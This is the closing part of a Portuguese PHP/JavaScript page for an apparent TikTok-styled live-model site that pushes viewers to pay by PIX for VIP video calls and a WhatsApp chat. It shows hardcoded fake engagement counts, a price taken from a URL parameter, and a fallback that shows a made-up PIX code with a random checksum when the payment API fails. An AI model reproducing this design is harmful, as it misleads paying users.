                            <div class="tiktok-action-icon share-button">
                                <i class="fas fa-share"></i>
                            </div>
                            <div class="tiktok-action-count">Share</div>
                        </div>
                    </div>
                    <div class="tiktok-bottom-gradient"></div>
                </div>
            </div>

            <!-- Video 5 - Último vídeo (mostra popup VIP) -->
            <div class="tiktok-video-container" id="video-1">
                <video class="tiktok-video" loop poster="https://livemodelo.com/menu/videotktk5.mp4">
                    <source src="https://livemodelo.com/menu/videotktk5.mp4" type="video/mp4">
                </video>
                <div class="tiktok-overlay">
                    <div class="tiktok-user-info">
                        <div class="tiktok-username">@gemeas_gi</div>
                        <div class="tiktok-caption">Acesso VIP com desconto só hoje 🔥 #tiktokbrasil</div>
                        <div class="tiktok-music">
                            <div class="tiktok-music-icon">
                                <i class="fas fa-music"></i>
                            </div>
                            <div>som original - Gêmeas Gi</div>
                        </div>
                    </div>
                    <div class="tiktok-actions">
                        <div class="tiktok-user-profile">
                            <img src="foto4.svg" alt="User Profile">
                        </div>
                        <div class="tiktok-follow-button">+</div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon like-button" data-video="5">
                                <i class="fas fa-heart"></i>
                            </div>
                            <div class="tiktok-action-count like-count">356</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon">
                                <i class="fas fa-comment-dots"></i>
                            </div>
                            <div class="tiktok-action-count">82</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon save-button" data-video="5">
                                <i class="fas fa-bookmark"></i>
                            </div>
                            <div class="tiktok-action-count save-count">117</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon share-button">
                                <i class="fas fa-share"></i>
                            </div>
                            <div class="tiktok-action-count">Share</div>
                        </div>
                    </div>
                    <div class="tiktok-bottom-gradient"></div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- VIP Payment Container -->
    <div class="payment-container" id="payment-container">
        <h2>VIP live 24hrs e Vídeo Chamada</h2>
        <h3>R$ <?php echo $valorFormatado; ?></h3>
        <div class="divider"></div>
        
        <div class="qr-code-container">
            <div class="qr-code-img">
                <img src="<?php echo $imgpix; ?>" alt="QR Code PIX" id="qrCodeImg">
            </div>
        </div>
        <div class="pix-code" id="pixCode" onclick="copyPixCode()"><?php echo $pixqr; ?></div>
        <button class="copy-button" onclick="copyPixCode()">
            <i class="fas fa-copy"></i> Copiar PIX
        </button>
        <p class="payment-note">Copie o código PIX e pague pelo seu banco. O acesso VIP será liberado após o pagamento.</p>
        
        <div id="statusPagamento" class="status-pending">
            <span class="loaderSpinner"></span> Aguardando pagamento...
        </div>
    </div>
    
    <!-- Chat Payment Container -->
    <div class="payment-container" id="chat-payment-container">
        <h2>Chat Privado no Whatsapp</h2>
        <h3>R$ <?php echo $chatValorFormatado; ?></h3>
        <div class="divider"></div>
        
        <div class="qr-code-container">
            <div class="qr-code-img">
                <img src="<?php echo $chatImgpix; ?>" alt="QR Code PIX" id="chatQrCodeImg">
            </div>
        </div>
        <div class="pix-code" id="chatPixCode"><?php echo $chatPixqr; ?></div>
        <input type="hidden" id="chat-transaction-id" value="<?php echo $chatTransactionId; ?>">
        <button class="copy-button" onclick="copyChatPixCode()">
            <i class="fas fa-copy"></i> Copiar PIX
        </button>
        <p class="payment-note">Copie o código PIX e pague no aplicativo do seu banco. O chat privado será liberado após a confirmação do pagamento.</p>
        
        <div class="status-payment status-pending" id="chatStatusPagamento">
            <span class="loader"></span> Aguardando pagamento...
        </div>
    </div>
    
    <!-- Toast Notification -->
    <div class="toast-notification" id="toast">
        <i class="fas fa-check-circle"></i>
        <span id="toast-message">Link copiado com sucesso!</span>
    </div>
    
    <script>
        // DOM Elements
        const tabAoVivo = document.getElementById('tab-aovivo');
        const tabTikTok = document.getElementById('tab-tiktok');
        const tiktokContainer = document.getElementById('tiktok-container');
        const tiktokBack = document.getElementById('tiktok-back');
        const tiktokVideos = document.getElementById('tiktok-videos');
        const paymentContainer = document.getElementById('payment-container');
        const chatPaymentContainer = document.getElementById('chat-payment-container');
        const toast = document.getElementById('toast');
        const toastMessage = document.getElementById('toast-message');
        const profilePopupContainer = document.getElementById('profile-popup-container');
        const profileLinks = document.querySelectorAll('.profile-link');
        const profilePopupClose = document.querySelector('.profile-popup-close');
        const profilePopupFollow = document.getElementById('profile-popup-follow');
        const profilePopupMessage = document.getElementById('profile-popup-message');
        const menuIcon = document.getElementById('menu-icon');
        const sidebar = document.getElementById('sidebar');
        const sidebarOverlay = document.getElementById('sidebar-overlay');
        const sidebarClose = document.getElementById('sidebar-close');
        const vipPopup = document.getElementById('vip-popup');
        const vipPopupButton = document.getElementById('vip-popup-button');
        
        // Profile Data
        const profileData = <?php echo json_encode($profileData); ?>;
        
        // Variables
        let currentVideo = 0;
        const totalVideos = 5;
        let isFollowing = false;
        
        // Event Listeners
        document.addEventListener('DOMContentLoaded', () => {
            setupTabs();
            setupTikTokVideos();
            setupButtons();
            setupGridView();
            setupProfilePopup();
            setupSidebar();
            // setupProfileClicks(); // Desativado para dar preferência ao gerenciamento de cliques em profileVisitedCookie.js
        });
        
        // Setup Profile Clicks - Implementa o redirecionamento e abrir popup
        function setupProfileClicks() {
            document.querySelectorAll('.profile').forEach(profile => {
                profile.addEventListener('click', function(e) {
                    // Ignorar clique se for no botão de perfil
                    if (e.target.classList.contains('profile-link') || e.target.closest('.profile-link')) {
                        return;
                    }
                    
                    // Ignorar clique se vier de um elemento com overlay VIP
                    if (e.target.closest('.vip-lock-overlay') || e.target.closest('.vip-button')) {
                        return;
                    }
                    
                    // Se o perfil tiver classe vip-locked, não continuamos
                    if (this.classList.contains('vip-locked')) {
                        return;
                    }
                    
                    const status = this.getAttribute('data-status');
                    
                    if (status === 'online') {
                        // O redirecionamento agora é tratado pelo listener global no script inicial
                        // Não precisamos duplicar o redirecionamento aqui
                    } else {
                        // Mostrar popup de perfil para OFFLINE
                        showProfilePopup(this.getAttribute('data-profile'));
                    }
                });
            });
        }
        
        // Setup Sidebar
        function setupSidebar() {
            menuIcon.addEventListener('click', () => {
                showSidebar();
            });
            
            sidebarClose.addEventListener('click', () => {
                hideSidebar();
            });
            
            sidebarOverlay.addEventListener('click', () => {
                hideSidebar();
            });
        }
        
        // Show Sidebar
        function showSidebar() {
            sidebar.classList.add('active');
            sidebarOverlay.style.display = 'block';
            document.body.style.overflow = 'hidden';
        }
        
        // Hide Sidebar
        function hideSidebar() {
            sidebar.classList.remove('active');
            sidebarOverlay.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
        
        // Setup Tabs
        function setupTabs() {
            tabAoVivo.addEventListener('click', () => {
                setActiveTab(tabAoVivo);
                hideTikTokContainer();
            });
            
            tabTikTok.addEventListener('click', () => {
                setActiveTab(tabTikTok);
                showTikTokContainer();
            });
            
            tiktokBack.addEventListener('click', () => {
                hideTikTokContainer();
                setActiveTab(tabAoVivo);
            });
        }
        
        // Setup Grid View
        function setupGridView() {
            const viewOptions = document.querySelectorAll('.view-option');
            const profilesGrid = document.querySelector('.profiles');
            
            viewOptions.forEach(option => {
                option.addEventListener('click', () => {
                    // Remove active class from all options
                    viewOptions.forEach(opt => opt.classList.remove('active'));
                    
                    // Add active class to clicked option
                    option.classList.add('active');
                    
                    // Get grid size from data attribute
                    const gridSize = option.getAttribute('data-grid');
                    
                    // Set grid template columns based on grid size
                    if (gridSize === '2') {
                        profilesGrid.style.gridTemplateColumns = 'repeat(2, 1fr)';
                    } else if (gridSize === '3') {
                        profilesGrid.style.gridTemplateColumns = 'repeat(3, 1fr)';
                    } else if (gridSize === '4') {
                        profilesGrid.style.gridTemplateColumns = 'repeat(4, 1fr)';
                    }
                });
            });
        }
        
        // Set Active Tab
        function setActiveTab(tab) {
            document.querySelectorAll('.tab').forEach(t => {
                t.classList.remove('active');
            });
            tab.classList.add('active');
        }
        
        // Show TikTok Container
        function showTikTokContainer() {
            tiktokContainer.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            
            // Reset video position if needed
            currentVideo = 0;
            playCurrentVideo();
        }
        
        // Hide TikTok Container
        function hideTikTokContainer() {
            tiktokContainer.style.display = 'none';
            document.body.style.overflow = 'auto';
            
            // Pause all videos
            document.querySelectorAll('.tiktok-video').forEach(video => {
                video.pause();
            });
        }
        
        // Setup TikTok Videos
        function setupTikTokVideos() {
            // Adiciona os cliques nos perfis AO VIVO dos vídeos TikTok para voltar à home
            document.querySelectorAll('.tiktok-user-profile.live-creator').forEach(profile => {
                profile.addEventListener('click', () => {
                    hideTikTokContainer();
                    setActiveTab(tabAoVivo);
                });
            });
            
            // Implement Scroll Snap Behavior
            tiktokVideos.addEventListener('scroll', () => {
                // Find which video is most visible
                const containers = document.querySelectorAll('.tiktok-video-container');
                const scrollTop = tiktokVideos.scrollTop;
                const containerHeight = containers[0].offsetHeight;
                
                const newVideo = Math.floor((scrollTop + containerHeight/2) / containerHeight);
                
                if (newVideo !== currentVideo) {
                    // Pause previous video
                    if (containers[currentVideo]) {
                        const prevVideo = containers[currentVideo].querySelector('video');
                        if (prevVideo) prevVideo.pause();
                    }
                    
                    currentVideo = newVideo;
                    playCurrentVideo();
                    
                    // Show payment container after last video
                    if (currentVideo >= totalVideos - 1) {
                        setTimeout(() => {
                            showVipPopup();
                        }, 1000);
                    }
                }
            });
            
            // Adiciona evento para o botão do popup VIP
            vipPopupButton.addEventListener('click', () => {
                hideVipPopup();
                hideTikTokContainer();
                setActiveTab(tabAoVivo);
            });
        }
        
        // Mostrar popup VIP
        function showVipPopup() {
            vipPopup.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
        
        // Esconder popup VIP
        function hideVipPopup() {
            vipPopup.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
        
        // Play Current Video
        function playCurrentVideo() {
            const containers = document.querySelectorAll('.tiktok-video-container');
            if (containers[currentVideo]) {
                const video = containers[currentVideo].querySelector('video');
                if (video) {
                    video.play().catch(e => console.log('Video play error:', e));
                }
            }
        }
        
        // Setup Profile Popup
        function setupProfilePopup() {
            // Show profile popup when profile link is clicked
            profileLinks.forEach(link => {
                link.addEventListener('click', (e) => {
                    e.preventDefault();
                    e.stopPropagation(); // Impede que o clique seja propagado para o elemento pai
                    const profileName = link.getAttribute('data-profile');
                    showProfilePopup(profileName);
                });
            });
            
            // Close profile popup when close button is clicked
            profilePopupClose.addEventListener('click', () => {
                hideProfilePopup();
            });
            
            // Close profile popup when clicking outside
            profilePopupContainer.addEventListener('click', (e) => {
                if (e.target === profilePopupContainer) {
                    hideProfilePopup();
                }
            });
            
            // Toggle follow button
            profilePopupFollow.addEventListener('click', () => {
                toggleFollow();
            });
            
            // Show chat payment when message button is clicked
            profilePopupMessage.addEventListener('click', function() {
                hideProfilePopup();
                
                // Get profile ID from the button attribute
                const profileId = this.getAttribute('data-profile-id');
                // Call the function from profileVisitedCookie.js if it exists
                if (typeof generatePix === 'function' && profileId) {
                    generatePix(profileId);
                } else {
                    // Fallback to the original function
                    generatePix();
                }
            });
        }
        
        // Gerar pagamento PIX
        function generatePix(profileId) {
            // Se temos um profile ID, podemos usá-lo para determinar o valor
            let valor = '29.90'; // Valor padrão para chat
            
            if (profileId) {
                // Obter valor diretamente do parâmetro ID da URL
                const urlParams = new URLSearchParams(window.location.search);
                const idParam = urlParams.get('id');
                if (idParam) {
                    valor = idParam;
                } else {
                    // Tenta obter o valor do redirecionamento associado ao perfil
                    const profileElement = document.querySelector(`.profile[data-profile="${profileId}"]`);
                    if (profileElement) {
                        const redirectUrl = profileElement.getAttribute('data-redirect');
                        if (redirectUrl) {
                            const urlParams = new URLSearchParams(redirectUrl.split('?')[1]);
                            const idParam = urlParams.get('id');
                            if (idParam) {
                                valor = idParam;
                            }
                        }
                    }
                }
            } else {
                // Fallback: obter o valor do parâmetro 'id' da URL atual
                const urlParams = new URLSearchParams(window.location.search);
                valor = urlParams.get('id') || '19.9';
            }
            
            // Garantir formato correto
            valor = valor.replace(',', '.');
            
            // Mostrar loader durante o carregamento
            const pageLoader = document.createElement('div');
            pageLoader.className = 'page-loader';
            pageLoader.innerHTML = `
                <img src="logo400x130.png" alt="Logo">
                <div class="loader"></div>
            `;
            document.body.appendChild(pageLoader);
            
            // Em vez de gerar o código localmente, fazemos uma requisição para 
            // a versão PHP obter um código PIX real via API
            fetch(`chat_pix_generate.php?valor=${valor}&profile=${profileId || ''}`)
                .then(response => response.json())
                .then(data => {
                    // Remover loader
                    document.body.removeChild(pageLoader);
                    
                    if (data.success) {
                        // Atualizamos os elementos UI com o código PIX recebido
                        document.getElementById('chatQrCodeImg').src = data.imgUrl;
                        document.getElementById('chatPixCode').textContent = data.pixCode;
                        document.getElementById('chat-transaction-id').value = data.transactionId;
                        
                        // Mostrar o container de pagamento
                        showChatPaymentContainer();
                        
                        // Iniciar verificação de status do pagamento
                        simulatePaymentStatus();
                    } else {
                        console.error('Erro ao gerar PIX:', data.error);
                        alert('Erro ao gerar pagamento. Tente novamente.');
                    }
                })
                .catch(error => {
                    // Remover loader
                    document.body.removeChild(pageLoader);
                    
                    console.error('Erro ao gerar PIX:', error);
                    
                    // Fallback - gerar código localmente em caso de erro
                    const randomNum = Math.floor(Math.random() * 9000) + 1000;
                    const pixCode = `00020126580014br.gov.bcb.pix0136a37c6499-c98f-4d9d-b451-0137e5fc3600520400005303986540${valor}5802BR5917PAGAMENTO VIP6008BRASILIA62070503***6304${randomNum}`;
                    
                    document.getElementById('chatQrCodeImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`;
                    document.getElementById('chatPixCode').textContent = pixCode;
                    
                    // Mostrar o container de pagamento mesmo com o erro
                    showChatPaymentContainer();
                });
        }
        
        // Verificação real do status de pagamento
        function simulatePaymentStatus() {
            const statusElement = document.getElementById('chatStatusPagamento');
            const transactionId = document.getElementById('chat-transaction-id').value;
            
            if (!transactionId) {
                console.error("ID da transação não encontrado");
                return;
            }
            
            // Verifica o status a cada 3 segundos
            const checkInterval = setInterval(() => {
                fetch(`verificar_status.php?transaction_id=${transactionId}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.status === "PAID") {
                            // Atualiza o status visual
                            statusElement.innerHTML = '<i class="fas fa-check-circle"></i> Pagamento confirmado!';
                            statusElement.classList.remove("status-pending");
                            statusElement.classList.add("status-success");
                            
                            // Limpa o intervalo
                            clearInterval(checkInterval);
                            
                            // Fecha o container após 2 segundos
                            setTimeout(() => {
                                chatPaymentContainer.classList.remove('active');
                                showToast('Chat privado liberado!');
                            }, 2000);
                        }
                    })
                    .catch(error => {
                        console.error("Erro ao verificar status:", error);
                    });
            }, 3000);
        }
        
        // Show Profile Popup
        function showProfilePopup(profileName) {
            const profile = profileData[profileName];
            
            if (profile) {
                // Set profile data
                document.getElementById('profile-popup-avatar-img').src = profile.image;
                document.getElementById('profile-popup-name-text').textContent = profileName;
                document.getElementById('profile-popup-verified').style.display = profile.verified ? 'inline' : 'none';
                document.getElementById('profile,-popup-live-hours').textContent = profile.liveHours;
                document.getElementById('profile-popup-followers').textContent = profile.followers;
                
                // Set profile ID on message button for PIX generation
                const msgButton = document.getElementById('profile-popup-message');
                if (msgButton) {
                    msgButton.setAttribute('data-profile-id', profileName);
                }
                document.getElementById('profile-popup-likes').textContent = profile.likes;
                document.getElementById('profile-popup-fullname').textContent = profile.fullName;
                document.getElementById('profile-popup-date').textContent = profile.creationDate;
                
                // Mostrar etiqueta "AO VIVO" se o perfil estiver online
                if (profile.status === 'online') {
                    document.getElementById('profile-live-indicator').style.display = 'block';
                } else {
                    document.getElementById('profile-live-indicator').style.display = 'none';
                }
                
                // Definir a capa personalizada
                document.getElementById('profile-popup-cover').src = profile.coverImage || 'https://picsum.photos/id/1015/800/400';
                
                // Reset follow button
                isFollowing = false;
                updateFollowButton();
                
                // Show popup
                profilePopupContainer.style.display = 'flex';
                document.body.style.overflow = 'hidden';
            }
        }
        
        // Hide Profile Popup
        function hideProfilePopup() {
            profilePopupContainer.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
        
        // Toggle Follow
        function toggleFollow() {
            isFollowing = !isFollowing;
            updateFollowButton();
            
            if (isFollowing) {
                showToast('Perfil seguido com sucesso!');
            }
        }
        
        // Update Follow Button
        function updateFollowButton() {
            if (isFollowing) {
                profilePopupFollow.innerHTML = '<i class="fas fa-user-check"></i> Seguindo';
                profilePopupFollow.classList.add('profile-popup-button-following');
            } else {
                profilePopupFollow.innerHTML = '<i class="fas fa-user-plus"></i> Seguir';
                profilePopupFollow.classList.remove('profile-popup-button-following');
            }
        }
        
        // Setup Buttons
        function setupButtons() {
            // Like Buttons
            document.querySelectorAll('.like-button').forEach(button => {
                button.addEventListener('click', function() {
                    const videoId = this.getAttribute('data-video');
                    this.classList.toggle('active');
                    if (this.classList.contains('active')) {
                        this.style.color = '#ff3366';
                    } else {
                        this.style.color = 'white';
                    }
                });
            });
            
            // Save Buttons
            document.querySelectorAll('.save-button').forEach(button => {
                button.addEventListener('click', function() {
                    const videoId = this.getAttribute('data-video');
                    this.classList.toggle('active');
                    if (this.classList.contains('active')) {
                        this.style.color = '#ffbe00';
                    } else {
                        this.style.color = 'white';
                    }
                });
            });
            
            // Share Buttons
            document.querySelectorAll('.share-button').forEach(button => {
                button.addEventListener('click', function() {
                    // Copy URL to clipboard
                    const url = window.location.href;
                    navigator.clipboard.writeText(url).then(() => {
                        showToast('Link copiado com sucesso!');
                    }).catch(err => {
                        console.error('Erro ao copiar link:', err);
                        showToast('Erro ao copiar link');
                    });
                });
            });
            
            // TikTok Follow Buttons
            document.querySelectorAll('.tiktok-follow-button').forEach(button => {
                button.addEventListener('click', function() {
                    this.innerHTML = '✓';
                    showToast('Perfil seguido com sucesso!');
                });
            });
            
            // Filter buttons
            document.querySelectorAll('.filter-button').forEach(button => {
                button.addEventListener('click', function() {
                    document.querySelectorAll('.filter-button').forEach(btn => {
                        btn.classList.remove('active');
                    });
                    this.classList.add('active');
                });
            });
            
            // Arrows for filter scrolling
            const filterContainer = document.querySelector('.filters');
            document.querySelector('.left-arrow').addEventListener('click', () => {
                filterContainer.scrollBy({ left: -200, behavior: 'smooth' });
            });
            
            document.querySelector('.right-arrow').addEventListener('click', () => {
                filterContainer.scrollBy({ left: 200, behavior: 'smooth' });
            });
        }
        
        // Show Toast Notification
        function showToast(message) {
            toastMessage.textContent = message;
            toast.style.display = 'flex';
            
            setTimeout(() => {
                toast.style.display = 'none';
            }, 3000);
        }
        
        // Show Payment Container
        function showPaymentContainer() {
            paymentContainer.classList.add('active');
        }
        
        // Show Chat Payment Container
        function showChatPaymentContainer() {
            chatPaymentContainer.classList.add('active');
        }
        
        // Copy PIX Code
        function copyPixCode() {
            const code = document.getElementById('pixCode').textContent;
            navigator.clipboard.writeText(code).then(() => {
                showToast('Código PIX copiado!');
            }).catch(err => {
                console.error('Erro ao copiar PIX:', err);
                showToast('Erro ao copiar código PIX');
            });
        }
        
        // Copy Chat PIX Code
        function copyChatPixCode() {
            const code = document.getElementById('chatPixCode').textContent;
            navigator.clipboard.writeText(code).then(() => {
                showToast('Código PIX copiado!');
            }).catch(err => {
                console.error('Erro ao copiar PIX:', err);
                showToast('Erro ao copiar código PIX');
            });
        }
        
        // Hide payment containers
        function hidePaymentContainers() {
            paymentContainer.classList.remove('active');
            chatPaymentContainer.classList.remove('active');
        }
        
        // Make responsive grid on resize - deixe o CSS fazer a maior parte do trabalho
        window.addEventListener('resize', function() {
            const activeViewOption = document.querySelector('.view-option.active');
            if (activeViewOption) {
                const profilesGrid = document.querySelector('.profiles');
                
                // Permite que as media queries do CSS façam o trabalho principal
                // Ajuste apenas para a visualização de grade selecionada pelo usuário
                if (window.innerWidth > 1200) {
                    // Em telas grandes, permitir customização de visualização
                    const gridSize = activeViewOption.getAttribute('data-grid');
                    if (gridSize && gridSize !== 'auto') {
                        profilesGrid.style.gridTemplateColumns = `repeat(${gridSize}, 1fr)`;
                    }
                }
                
                // Ajusta o tamanho do perfil recomendado com base no tamanho da tela
                const recommendedProfile = document.querySelector('.profile.recommended');
                if (recommendedProfile) {
                    if (window.innerWidth <= 576) {
                        recommendedProfile.style.gridColumn = '1 / -1';
                        recommendedProfile.style.transform = 'scale(1)';
                    } else if (window.innerWidth <= 992) {
                        recommendedProfile.style.gridColumn = 'span 2';
                        recommendedProfile.style.transform = 'scale(1.02)';
                    } else {
                        recommendedProfile.style.gridColumn = 'span 2';
                        recommendedProfile.style.transform = 'scale(1.05)';
                    }
                }
            }
        });
        
        // Trigger resize event on load
        window.dispatchEvent(new Event('resize'));
    </script>
    
    <!-- Include the profile visited cookie management script -->
    <script src="profileVisitedCookie.js"></script>

    <!-- Add CSS for VIP lock overlay -->
    <style>
        .vip-locked {
            position: relative;
        }
        
        .vip-lock-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.5);
            backdrop-filter: blur(4px);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border-radius: 15px;
            z-index: 10;
        }
        
        .vip-lock-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            padding: 10px;
        }
        
        .vip-lock-content i {
            font-size: 30px;
            color: var(--dark-gray);
            margin-bottom: 10px;
        }
        
        .vip-lock-content p {
            font-weight: bold;
            margin-bottom: 15px;
            color: var(--dark-gray);
        }
        
        .vip-lock-content .vip-button {
            background: linear-gradient(to bottom, var(--vip-gold), var(--vip-gold-dark));
            color: #000;
            border: none;
            padding: 8px 15px;
            border-radius: 20px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            transition: all 0.3s ease;
        }
        
        .vip-lock-content .vip-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }
    </style>
</body>
</html>